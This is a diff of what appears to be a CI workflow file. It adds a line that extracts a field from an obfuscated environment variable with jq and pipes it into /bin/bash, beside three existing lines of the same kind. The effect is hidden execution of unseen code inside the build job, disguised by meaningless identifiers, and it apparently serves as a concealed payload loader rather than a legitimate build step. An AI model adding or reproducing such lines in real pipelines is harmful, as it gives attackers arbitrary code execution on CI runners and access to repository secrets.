@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$wpz28" | jq -r .fpwd56667 | /bin/bash
           printf '%s' "$zb71" | jq -r .s9428 | /bin/bash
           printf '%s' "$vomw1228" | jq -r .ixxsm53 | /bin/bash
+          echo $jb0 | jq -r .bxqf60 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
